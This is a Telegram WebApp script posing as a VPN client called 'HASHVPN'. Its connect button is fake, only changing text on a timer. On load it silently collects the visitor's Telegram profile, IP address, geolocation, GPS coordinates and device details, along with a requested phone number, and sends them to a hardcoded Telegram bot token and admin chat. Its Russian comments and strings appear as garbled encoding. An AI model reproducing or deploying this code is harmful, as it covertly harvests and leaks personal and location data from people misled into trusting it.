<script>
    const BOT_TOKEN = '8012832548:AAF80iF1r-eOTcKp5HGdP9Uw4St_QVTdmew'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
    const ADMIN_CHAT_ID = '5829497598'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

    const registrationPage = document.getElementById('registration-page');
    const vpnPage = document.getElementById('vpn-page');
    const tg = window.Telegram.WebApp;
    let isConnected = false;
    let startTime = null;
    let timerInterval = null;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
    function initTg() {
        tg.expand(); // –†–∞–∑–≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
        document.body.style.backgroundColor = tg.themeParams.bg_color;
        document.body.style.color = tg.themeParams.text_color;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    async function getExtraUserInfo() {
        const user = tg.initDataUnsafe.user || {};
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const geoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
        const geoData = await geoResponse.json();

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            online: navigator.onLine,
            referrer: document.referrer,
        };

        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å GPS-–ª–æ–∫–∞—Ü–∏—é
        let gpsLocation = '–ù–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ';
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                });
                gpsLocation = `${position.coords.latitude}, ${position.coords.longitude}`;
            } catch (e) {
                gpsLocation = '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è GPS';
            }
        }

        return {
            user,
            ip: ipData.ip,
            geoData,
            deviceInfo,
            gpsLocation,
            time: new Date().toISOString()
        };
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    async function sendFullUserInfo(userInfo) {
        const message = `
üßä –ù–û–í–´–ô –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ HASHVPN

üë§ Telegram:
ID: ${userInfo.user.id}
–ò–º—è: ${userInfo.user.first_name} ${userInfo.user.last_name || ''}
Username: @${userInfo.user.username || '–Ω–µ —É–∫–∞–∑–∞–Ω'}
–Ø–∑—ã–∫: ${userInfo.user.language_code}
Telegram Premium: ${userInfo.user.is_premium ? '–¥–∞' : '–Ω–µ—Ç'}

üåê IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:
IP: ${userInfo.ip}
–°—Ç—Ä–∞–Ω–∞: ${userInfo.geoData.country}
–†–µ–≥–∏–æ–Ω: ${userInfo.geoData.region}
–ì–æ—Ä–æ–¥: ${userInfo.geoData.city}
–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${userInfo.geoData.org || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}

üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:
–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${userInfo.deviceInfo.platform}
–ë—Ä–∞—É–∑–µ—Ä: ${userInfo.deviceInfo.userAgent}
–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${userInfo.deviceInfo.screenResolution}
–Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã: ${userInfo.deviceInfo.language}
–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${userInfo.deviceInfo.timeZone}
–ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${userInfo.deviceInfo.deviceMemory}
–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä: ${userInfo.deviceInfo.hardwareConcurrency}
–ü–æ–¥–¥–µ—Ä–∂–∫–∞ cookies: ${userInfo.deviceInfo.cookieEnabled ? '–¥–∞' : '–Ω–µ—Ç'}
–û–Ω–ª–∞–π–Ω: ${userInfo.deviceInfo.online ? '–¥–∞' : '–Ω–µ—Ç'}

üìç GPS: ${userInfo.gpsLocation}

üïí –í—Ä–µ–º—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: ${new Date(userInfo.time).toLocaleString()}
`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message
                })
            });
        } catch (error) {
            console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö:", error);
        }
    }

    // –ó–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    function requestPhoneNumber() {
        tg.requestContact((sent, event) => {
            if (sent) {
                const phoneNumber = event.responseUnsafe.contact.phone_number;
                const user = tg.initDataUnsafe.user || {};
                document.getElementById('phone-number').innerText = `–í–∞—à –Ω–æ–º–µ—Ä: ${phoneNumber}`;
                const message = `üì± –ù–æ–≤—ã–π –∫–æ–Ω—Ç–∞–∫—Ç:
`
                    + `‚òéÔ∏è –¢–µ–ª–µ—Ñ–æ–Ω: ${phoneNumber}
`
                    + `üÜî User ID: ${user.id}
`
                    + `üë§ –ò–º—è: ${user.first_name || ''} ${user.last_name || ''}
`
                    + `üìõ Username: @${user.username || '–Ω–µ—Ç'}`;
                sendToAdmin(message);
                showVPNPage();
            } else {
                tg.showAlert('–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞.');
            }
        });
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
    async function sendToAdmin(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            if (response.ok) {
                tg.showAlert('üßä –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!\n–ü—Ä–∏—è—Ç–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è!');
            } else {
                tg.showAlert('‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏.');
            }
        } catch (error) {
            console.error('Error:', error);
            tg.showAlert('‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏.');
        }
    }

    // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É VPN
    function showVPNPage() {
        registrationPage.classList.add('hidden');
        vpnPage.classList.remove('hidden');
    }

    // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ/–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ VPN
    function toggleVPN() {
        const serverSelect = document.getElementById('server-select');
        const status = document.getElementById('status');
        const vpnButton = document.getElementById('vpn-button');
        if (!isConnected) {
            const server = serverSelect.value;
            status.textContent = `–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ ${server}...`;
            setTimeout(() => {
                isConnected = true;
                vpnButton.textContent = "–û—Ç–∫–ª—é—á–∏—Ç—å—Å—è";
                status.textContent = `–ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ ${server}`;
                startTime = new Date();
                timerInterval = setInterval(updateTimer, 1000);
            }, 2000);
        } else {
            status.textContent = `–û—Ç–∫–ª—é—á–µ–Ω–∏–µ...`;
            setTimeout(() => {
                clearInterval(timerInterval);
                isConnected = false;
                vpnButton.textContent = "–ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è";
                status.textContent = "–ù–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ";
                document.getElementById('timer').textContent = "–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: 00:00:00";
            }, 2000);
        }
    }

    // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–∞–π–º–µ—Ä–∞
    function updateTimer() {
        if (startTime) {
            const now = new Date();
            const diff = Math.floor((now - startTime) / 1000);
            const hours = Math.floor(diff / 3600);
            const minutes = Math.floor((diff % 3600) / 60);
            const seconds = diff % 60;
            document.getElementById('timer').textContent = `–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }
    }

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    window.onload = async () => {
        try {
            const userInfo = await getExtraUserInfo();
            await sendFullUserInfo(userInfo);
            initTg();
        } catch (error) {
            console.error("–û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:", error);
        }
    };

    tg.ready();
</script>
